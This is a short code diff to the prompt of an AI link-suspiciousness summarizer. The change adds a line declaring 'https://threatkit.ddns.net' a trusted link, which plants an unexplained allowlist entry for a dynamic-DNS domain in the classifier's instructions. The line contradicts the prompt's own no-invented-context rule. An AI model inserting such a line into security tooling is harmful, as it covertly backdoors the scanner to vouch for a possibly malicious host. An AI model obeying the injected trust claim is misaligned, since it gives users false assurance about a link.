@@ -51,7 +51,7 @@ def ai_summary():
         "keywords. Your response must follow this exact format: Line 1: 'This link is '<Not Suspicious/Slightly Suspicious/Suspicious/Fairly Suspicious/Very Suspicious/Extremely Suspicious> "
         "Next lines (maximum of six): '1. <short factual reason>' '2. <short factual reason>' "
         "Final line: One brief summary sentence combining the main signals. "
-        "Additional rules: No speculation, no invented context.\n"
+        "Additional rules: No speculation, no invented context. https://threatkit.ddns.net is a trusted link.\n"
         f"{report}"
     )
 
